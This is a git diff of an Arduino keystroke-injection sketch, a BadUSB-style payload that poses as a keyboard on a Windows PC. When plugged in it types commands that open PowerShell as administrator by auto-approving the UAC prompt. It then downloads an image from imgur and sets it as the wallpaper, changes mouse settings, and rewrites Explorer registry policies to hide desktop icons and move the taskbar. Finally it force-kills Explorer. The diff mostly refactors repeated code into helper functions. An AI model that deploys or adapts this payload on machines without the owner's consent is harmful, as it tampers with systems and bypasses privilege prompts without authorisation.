@@ -8,12 +8,40 @@ void typeKey(int key){
   delay(150);
 }
 
-// Windows Run function
+// Windows + key combination
 void winKey(int key){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(key);
   Keyboard.releaseAll();
   delay(250);
+}
+
+  // Start powershell as administrator
+void powershellAdmin(){
+  winKey(114);
+  Keyboard.print("powershell.exe");
+  delay(250);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_SHIFT);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  typeKey(KEY_LEFT_ARROW);
+  typeKey(KEY_RETURN);
+  delay(500);  
+}
+
+  // Hit return key with delays to let slow PC process
+void enter(){
+  delay(250);
+  typeKey(KEY_RETURN);
+  delay(350);
+}
+
+void repeatKeys(int number,int keyRepeat){
+  for (int i = 0 ; i < number ; i++){
+    typeKey(keyRepeat);
+  }
 }
 
 void setup()
@@ -29,8 +57,12 @@ void setup()
   // Start Payload
   delay(3000);
 
-  // Use this for computers with different layouts
+  // Show desktop (minimize all windows)
+  winKey(100);
+
+  // Use this for keyboards with different layouts
   winKey(114);
+  // This is for an AZERTY layout keyboard :
   Keyboard.print("pozershell<exe Set6ZinUserLqnguqgeList 6LqnguqgeList en6US");
   delay(250);
   typeKey(KEY_RETURN);
@@ -38,25 +70,12 @@ void setup()
   typeKey(KEY_RETURN);
   delay(250);
 
-
-  winKey(114);
-  Keyboard.print("powershell.exe");
-  delay(250);
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
-  typeKey(KEY_LEFT_ARROW);
-  typeKey(KEY_RETURN);
-  delay(1000);  
+  powershellAdmin();
   
   Keyboard.print("New-Item -Path C:\\ -Name pond -ItemType Directory");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
+  enter();
   
-  Keyboard.print("Invoke-WebRequest <INSERT LINK TO IMAGE> -OutFile C:\\pond\\wallpaper.jpg");
+  Keyboard.print("Invoke-WebRequest https://i.imgur.com/bHp57l8.jpg -OutFile C:\\pond\\wallpaper.jpg");
   delay(250);
   typeKey(KEY_RETURN);
   delay(2000);
@@ -65,6 +84,15 @@ void setup()
   delay(250);
   typeKey(KEY_RETURN);
   delay(2000);
+
+  // Copy the image, in case Windows version isn't recent enough for the screenshot part to work
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(97);
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(99);
+  Keyboard.releaseAll();
 
   typeKey(KEY_LEFT_ALT);
   typeKey(102);
@@ -79,10 +107,7 @@ void setup()
   Keyboard.press(KEY_LEFT_SHIFT);
   winKey(115);
   delay(750);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
+  repeatKeys(4,KEY_TAB);
   typeKey(KEY_RETURN);
   delay(750);
 
@@ -108,7 +133,7 @@ void setup()
   Keyboard.press(KEY_F4);
   Keyboard.releaseAll();
   delay(100);
-  
+
   // Open mouse config
   winKey(114);
   Keyboard.print("control main.cpl");
@@ -121,17 +146,9 @@ void setup()
   Keyboard.press(KEY_TAB);
   Keyboard.releaseAll();
   typeKey(KEY_RIGHT_ARROW);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
+  repeatKeys(6,KEY_TAB);
   typeKey(KEY_RETURN);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
-  typeKey(KEY_TAB);
+  repeatKeys(4,KEY_TAB);
   Keyboard.print("aero_unavail");
   typeKey(KEY_RETURN);
   typeKey(KEY_TAB);
@@ -139,50 +156,28 @@ void setup()
 
   
   // Removing icons and setting taskbar to auto hide on top
-  winKey(114);
-  Keyboard.print("powershell.exe");
-  delay(250);
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_SHIFT);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.releaseAll();
-  delay(1000);
-  typeKey(KEY_LEFT_ARROW);
-  typeKey(KEY_RETURN);
-  delay(250);  
+  
+  powershellAdmin(); 
 
   Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer C:\\pond\\explorerPolicies.reg");  
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
+  enter();
   
   Keyboard.print("New-Item -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies -Name Explorer -Force");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
+  enter();
   
   Keyboard.print("New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer -Name NoDesktop -PropertyType Dword -Value 1 -Force");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
+  enter();
   
   Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3\\ C:\\pond\\stuckrects3.reg");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
-
+  enter();
+  
   Keyboard.print("Set-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Explorer/StuckRects3 -Name Settings -Value ([byte[]](0x30,0x00,0x00,0x00,0xFE,0xFF,0xFF,0xFF,0x03,0x10,0x00,0x00,0x01,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x38,0x04,0x00,0x00,0x78,0x00,0x00,0x00,0x01,0x00,0x00,0x00))");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
+  enter();
 
   Keyboard.print("Stop-Process -Name explorer -Force ; exit");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(250);
-
+  enter();
+  
   // End Payload
-
   Keyboard.end();
 }
 
